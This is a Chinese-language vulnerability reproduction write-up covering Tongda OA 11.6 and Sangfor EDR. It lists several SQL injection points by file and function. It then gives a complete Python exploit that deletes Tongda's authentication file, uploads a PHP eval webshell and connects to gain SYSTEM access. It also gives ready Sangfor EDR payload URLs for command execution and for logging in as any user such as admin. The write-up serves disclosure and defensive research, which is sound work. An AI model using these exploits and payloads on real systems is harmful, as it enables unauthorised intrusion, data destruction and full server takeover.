**漏洞复现**

通达OA的SQL注入和RCE及getshell漏洞复现，版本为11.6

深信服EDR的RCE漏洞复现，版本影响范围<=v3.2.19（任意用户登录） v3.2.16-19（RCE）

## 一、通达OA漏洞复现

###  **1、SQL** **注入**

在【日程管理】->【查询日程】位置

![1624114255_60ce044f7407c158af6b4.png!small?1624114255558](https://image.3001.net/images/20210619/1624114255_60ce044f7407c158af6b4.png!small?1624114255558)

漏洞文件：webroot\general\appbuilder\modules\calendar\models\Calendar.php。

get_callist_data函数接收传入的begin_date变量未经过滤直接拼接在查询语句中造成注入。

![1624114273_60ce046104bcfe96fccd7.png!small?1624114273195](https://image.3001.net/images/20210619/1624114273_60ce046104bcfe96fccd7.png!small?1624114273195)

![1624114306_60ce04826ef8ab3bcaf9a.png!small?1624114306555](https://image.3001.net/images/20210619/1624114306_60ce04826ef8ab3bcaf9a.png!small?1624114306555)

利用条件：

一枚普通账号登录权限，但测试后，发现一些低版本无需登录也可注入。

###  **2、SQL** **注入**

在【个人信息】->【收件箱】位置

![1624114356_60ce04b414c6b6f55828f.png!small?1624114356130](https://image.3001.net/images/20210619/1624114356_60ce04b414c6b6f55828f.png!small?1624114356130)

![1624114364_60ce04bc0dc3f4967eb70.png!small?1624114364314](https://image.3001.net/images/20210619/1624114364_60ce04bc0dc3f4967eb70.png!small?1624114364314)

漏洞文件：webroot\inc\utility_email.php，get_sentbox_data函数接收传入参数未过滤，直接拼接在order
by后面了造成注入。

![1624114374_60ce04c62634e86679d37.png!small?1624114374292](https://image.3001.net/images/20210619/1624114374_60ce04c62634e86679d37.png!small?1624114374292)

利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

###  **3、SQL** **注入**

漏洞文件：webroot\inc\utility_email.php，get_email_data函数传入参数未过滤，直接拼接在order
by后面了造成注入。

![1624114384_60ce04d05539385a5bd36.png!small?1624114384485](https://image.3001.net/images/20210619/1624114384_60ce04d05539385a5bd36.png!small?1624114384485)

![1624114416_60ce04f08e7414fa68259.png!small?1624114416738](https://image.3001.net/images/20210619/1624114416_60ce04f08e7414fa68259.png!small?1624114416738)

利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

###  **4、SQL** **注入**

漏洞文件：webroot\general\appbuilder\modules\report\controllers\RepdetailController.php，actionEdit函数中存在
一个$_GET["id"]; 未经过滤，拼接到SQL查询中，造成了SQL注入。

![1624114444_60ce050c5aaafb5d8b408.png!small?1624114444505](https://image.3001.net/images/20210619/1624114444_60ce050c5aaafb5d8b408.png!small?1624114444505)

![1624114452_60ce0514dc80ba62dcba0.png!small?1624114452952](https://image.3001.net/images/20210619/1624114452_60ce0514dc80ba62dcba0.png!small?1624114452952)

利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

###  **5、** **任意文件上传、RCE及越权漏洞**

该漏洞是由于print.php存在任意文件删除漏洞，通过删除通达OA身份认证文件auth.inc.php达到绕过登录限制, 结合任意文件上传达到RCE的效果

exp直接打，直接写到网站根目录下，文件名为：_agan.php，菜刀链接密码为：agan

EXP为：

> import requests
>
> target="http://192.168.10.1:80/"
>
> payload="<?php eval($_POST['agan']);?>"
>
> print("[*]Warning,This exploit code will DELETE auth.inc.php which may
> damage the OA")
>
> input("Press enter to continue")
>
> print("[*]Deleting auth.inc.php....")
>
>
> url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
>
> requests.get(url=url)
>
> print("[*]Checking if file deleted...")
>
> url=target+"/inc/auth.inc.php"
>
> page=requests.get(url=url).text
>
> if 'No input file specified.' not in page:
>
> print("[-]Failed to deleted auth.inc.php")
>
> exit(-1)
>
> print("[+]Successfully deleted auth.inc.php!")
>
> print("[*]Uploading payload...")
>
>
> url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
>
> files = {'FILE1': ('agan.php', payload)}
>
> requests.post(url=url,files=files)
>
> url=target+"/_agan.php"
>
> page=requests.get(url=url).text
>
> if 'No input file specified.' not in page:
>
> print("[+]Filed Uploaded Successfully")
>
> print("[+]URL:",url)
>
> else:
>
> print("[-]Failed to upload file")

![1624114486_60ce0536b0a8a6641c855.png!small?1624114486790](https://image.3001.net/images/20210619/1624114486_60ce0536b0a8a6641c855.png!small?1624114486790)

利用oa未授权漏洞结合任意文件上传getshell

![1624114575_60ce058fe9c314b0a2f26.png!small?1624114576084](https://image.3001.net/images/20210619/1624114575_60ce058fe9c314b0a2f26.png!small?1624114576084)

可以看到成功写入，先访问这个目录看看，是真实存在的

链接地址：http://192.168.10.1:80/_agan.php

![1624114589_60ce059dcf6ce2a706144.png!small?1624114590048](https://image.3001.net/images/20210619/1624114589_60ce059dcf6ce2a706144.png!small?1624114590048)

连接蚁剑http://192.168.10.1:80/_agan.php，密码是agan，连接成功

![1624114624_60ce05c017ce4b8d0bc2b.png!small?1624114624389](https://image.3001.net/images/20210619/1624114624_60ce05c017ce4b8d0bc2b.png!small?1624114624389)

![1624114630_60ce05c6cc428353c732d.png!small?1624114631096](https://image.3001.net/images/20210619/1624114630_60ce05c6cc428353c732d.png!small?1624114631096)

使用whoami查看当前用户权限。发现为system权限。

  

## 二、深信服EDR漏洞复现

###  **1、** **深信服EDR RCE漏洞**

查看当前用户：https://192.168.179.199/tool/log/c.php?strip_slashes=system&host=whoami

![1624114779_60ce065bc0a3710d988d2.png!small?1624114779923](https://image.3001.net/images/20210619/1624114779_60ce065bc0a3710d988d2.png!small?1624114779923)

查看路径：https://192.168.179.199/tool/log/c.php?strip_slashes=system&host=pwd

![1624114784_60ce0660761207fa0868d.png!small?1624114784708](https://image.3001.net/images/20210619/1624114784_60ce0660761207fa0868d.png!small?1624114784708)

查看当前路径下有哪些文件：

https://192.168.179.199/tool/log/c.php?strip_slashes=system&host=ls

![1624114789_60ce06659bda748361997.png!small?1624114789662](https://image.3001.net/images/20210619/1624114789_60ce06659bda748361997.png!small?1624114789662)

使用more命令，查看l.php文件内容：

https://192.168.179.199/tool/log/c.php?strip_slashes=system&host=more%20/ac/dc/ldb/bin/web/tool/log/l.php

![1624114821_60ce0685347b07a253e77.png!small?1624114821352](https://image.3001.net/images/20210619/1624114821_60ce0685347b07a253e77.png!small?1624114821352)

  

###  **2、** **深信服EDR 任意用户登录漏洞**

通过更改user参数的值即可实现任意用户登录

比如登录admin账户的Payload：

https://192.168.179.199/ui/login.php?user=admin

![1624114848_60ce06a0969042c6ef242.png!small?1624114848733](https://image.3001.net/images/20210619/1624114848_60ce06a0969042c6ef242.png!small?1624114848733)

  

或者登录test用户的payload：

https://192.168.179.199/ui/login.php?user=test

![1624114876_60ce06bc74a436793ba40.png!small?1624114876621](https://image.3001.net/images/20210619/1624114876_60ce06bc74a436793ba40.png!small?1624114876621)

  

###  **总结：**

安全产品本身的软件周期也需要十分严谨的安全意识伴随。

